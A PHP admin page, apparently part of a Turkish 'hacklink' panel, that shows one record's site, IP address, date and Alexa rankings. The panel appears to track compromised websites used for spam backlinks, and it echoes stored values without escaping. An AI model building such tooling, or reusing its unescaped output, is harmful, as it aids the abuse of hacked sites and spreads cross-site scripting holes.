<?php
	
session_start();
ob_start();
require 'baglantilar/database.php';

if( isset($_SESSION['user_id']) && !empty($_SESSION['user_id']) ){

	$bilgiler = $conn->prepare('SELECT * FROM kullanicilar WHERE id = :id');
	$bilgiler->bindParam(':id', $_SESSION['user_id']);
	$bilgiler->execute();
	$sonucbilgi = $bilgiler->fetch(PDO::FETCH_ASSOC);

	$kullanicii = NULL;

	if( count($sonucbilgi) > 0){
		$kullanicii = $sonucbilgi;
	}

}
else
{
	header("Location: giris.php");
	die();
}
?>

<?php 

$vericek = $conn -> prepare("SELECT * FROM hacklinkler where id = :id");
$vericek->bindParam(':id', $_GET['numara']);
$vericek-> execute();
$veriyigoster = $vericek -> fetch(PDO::FETCH_ASSOC);
?>
<?php
$alanadi = $veriyigoster["log"];
$alexaverisi = simplexml_load_file('http://data.alexa.com/data?cli=10&url='.$alanadi);
$dunyasiralamasi = number_format( (int) $alexaverisi->SD->POPULARITY['TEXT'] );
$ulkekodumuz = $alexaverisi->SD->COUNTRY['CODE'];
$ulkeadi = $alexaverisi->SD->COUNTRY['NAME'];
$ulkesiralamasi = number_format( (int) $alexaverisi->SD->COUNTRY['RANK'] );
$veriyigetir1 = $dunyasiralamasi;
$veriyigetir2 = $ulkeadi;
$veriyigetir3 = $ulkesiralamasi;
?>
     


 <div class="row clearfix">
            <div class="col-lg-12 col-md-12 col-sm-12">
                <div class="card">
                    <div class="header">
                        <h2><strong>Tablo</strong> <small><?php echo $veriyigoster['id']; ?> Numarali Hacklink Yönetimi</small> </h2>                        
                    </div>
                    <div class="body table-responsive">
                        <table class="table">
                            <thead>
                                <tr>
                                    <th>#</th>
                                    <th>Site</th>
                                    <th>İP Adresi</th>
                                    <th>Tarih</th>
                                    <th>Alexa Dünya Sıralaması</th>
									<th>Alexa Ülke Sıralaması</th>
									<th>Alexa Ülke Adı</th>
                                </tr>
                            </thead>
							
					

                            <tbody>
                                <tr>
                                    <th scope="row"><?php echo $veriyigoster['id']; ?></th>
                                    <td><?php echo $veriyigoster['log']; ?></td>
                                    <td><?php echo $veriyigoster['ip']; ?></td>
                                    <td><?php echo $veriyigoster['tarih']; ?></td>
                                    <td><center><?php echo $veriyigetir1; ?></center></a></td>
									<td><center><?php echo $veriyigetir3; ?></center></a></td>
									<td><center><?php echo $veriyigetir2; ?></center></a></td>
                                </tr>                           
                            </tbody>

                        </table>
                    </div>
                </div>
            </div>
        </div>